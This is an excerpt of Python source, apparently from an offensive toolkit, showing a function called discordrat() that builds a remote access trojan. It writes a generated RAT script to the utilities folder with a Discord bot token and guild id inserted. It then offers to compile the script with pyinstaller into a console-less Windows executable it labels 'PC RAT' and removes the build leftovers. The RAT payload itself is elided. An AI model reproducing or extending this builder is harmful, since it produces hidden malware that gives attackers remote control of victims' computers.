...
def discordrat():
    ...
    try:
        with open(f"utilities/{fileName}.py", "w") as file:
...
client.run(token)""".replace("~~TOKENHERE~~'", tokenbot + "'; g = [" + guildid + "]"))
    ...
    print(f"""\n\n\n{y}[{Fore.LIGHTGREEN_EX }!{y}]{w} File has been correctly written to "utilities/{fileName}.py" """)
    convert = input(f"""{y}[{b}#{y}]{w} Convert your script into an executable (Y/N) ? """)
    if convert.upper() == 'y' or convert.upper() == 'Y':
        try:
            time.sleep(1)

            print(f'{y}[{b}#{y}]{w} Creating PC RAT')
            time.sleep(1)
            os.system(f"pyinstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} utilities/{fileName}.py")
            print(f'\n\n{y}[{b}#{y}]{w} Cleaning up old files...')
            time.sleep(1)
            try:
                import shutil
                os.remove(f"{fileName}.spec")
                shutil.rmtree(f"build")
                shutil.move(f"dist/{fileName}.exe", "utilities")
